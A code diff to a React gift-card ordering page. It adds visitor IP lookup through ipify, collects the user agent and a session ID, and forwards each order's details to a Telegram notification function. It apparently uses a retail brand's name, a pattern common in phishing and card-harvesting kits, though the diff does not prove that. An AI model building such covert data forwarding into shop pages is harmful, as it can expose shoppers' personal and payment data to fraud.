@@ -1,4 +1,5 @@
-import { useState } from "react";
+
+import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -15,6 +16,7 @@ import {
 } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { supabase } from "@/integrations/supabase/client";
+import { v4 as uuidv4 } from 'uuid';
 
 const GIFT_CARD_VALUES = [100, 500, 1000, 5000];
 const CARD_TYPES = [
@@ -45,6 +47,29 @@ const Index = () => {
   });
   const [errors, setErrors] = useState<Record<string, string>>({});
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [sessionId, setSessionId] = useState<string>("");
+  const [userIp, setUserIp] = useState<string>("");
+
+  // Generate a session ID and get user IP on component mount
+  useEffect(() => {
+    // Generate a session ID
+    const newSessionId = uuidv4();
+    setSessionId(newSessionId);
+    localStorage.setItem("sessionId", newSessionId);
+    
+    // Get user IP address
+    const fetchUserIp = async () => {
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        setUserIp(data.ip);
+      } catch (error) {
+        console.error("Error fetching IP address:", error);
+      }
+    };
+    
+    fetchUserIp();
+  }, []);
 
   const validateField = (name: string, value: string): string => {
     switch (name) {
@@ -171,8 +196,29 @@ const Index = () => {
           city: formData.city,
           state: formData.state,
           zipCode: formData.zipCode
-        } : null
+        } : null,
+        userInfo: {
+          ip: userIp,
+          userAgent: navigator.userAgent,
+          sessionId: sessionId,
+          timestamp: new Date().toISOString()
+        },
+        notificationType: "order_placed"
       };
+
+      // Send notification to Telegram
+      try {
+        const { data, error } = await supabase.functions.invoke('send-telegram-notification', {
+          body: orderDetails
+        });
+
+        if (error) {
+          console.error('Error sending Telegram notification:', error);
+        }
+      } catch (notificationError) {
+        console.error('Failed to send notification:', notificationError);
+        // Don't block the order process if notification fails
+      }
 
       // Save order details to localStorage for reference
       localStorage.setItem("hotTopicOrder", JSON.stringify(orderDetails));
